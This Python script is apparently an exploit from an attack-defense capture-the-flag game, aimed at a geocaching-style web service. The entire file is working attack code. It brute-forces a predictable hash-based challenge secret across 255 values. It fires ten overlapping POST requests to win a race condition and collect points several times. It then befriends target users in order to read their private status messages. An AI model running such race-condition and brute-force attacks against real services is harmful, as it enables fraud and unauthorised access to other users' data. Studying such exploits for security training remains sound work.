import hashlib

import requests

try:
	from exploits.common import *
except ImportError:
	from common import *


def find_secret_solution(target, name, ippart=None):
	if ippart is None:
		ip = socket.gethostbyname(target.split(':')[0])
		ippart = ip.split('.')[2]
	return 'geocache{' + hashlib.sha256((name + '|' + str(ippart)).encode('utf-8')).hexdigest()[:12] + '}'


def bruteforce_challenge_solution(session, target, name):
	for i in range(0, 255):
		print(i, '...')
		if session.post('http://{}/api/secret/found'.format(target), json={'name': name, 'solution': find_secret_solution(target, name, i)}).status_code == 200:
			return i
	return None


def attack_rc_points(target: str):
	session = requests.session()
	username = login(session, target)
	interesting_visitors = get_interesting_visitors(session, target)

	# bruteforce solution (can be replaced by team id later)
	ippart = bruteforce_challenge_solution(session, target, 'Cloef')
	print('Secret: ', ippart)

	# get points
	name = 'Observation Tower'
	solution = find_secret_solution(target, name, ippart)
	print('Challenge', name, 'solution', solution)
	request = build_post_request(target, '/api/secret/found', {'name': name, 'solution': solution}, session.cookies.get_dict())
	# send this request multiple times, so that it overlaps as much as possible
	sockets = [get_socket_to_host(target) for _ in range(10)]
	for sock in sockets: sock.sendall(request[:-1])
	for sock in sockets: sock.sendall(request[-1:])

	# check result
	success = 0
	for sock in sockets:
		text = receive_all_and_close(sock)
		if b'200' in text.split(b"\r\n", 2)[0]:
			success += 1
	print('Success in {} / {} cases'.format(success, len(sockets)))
	print(session.get('http://{}/api/me'.format(target)).text)

	# befriend and access
	for visitor in interesting_visitors:
		print('--- {} ---'.format(username))
		session.post('http://{}/api/visitor/friends/{}'.format(target, visitor))
		print(session.get('http://{}/api/statusmessage/{}'.format(target, visitor)).text)


if __name__ == '__main__':
	attack_rc_points(default_target())
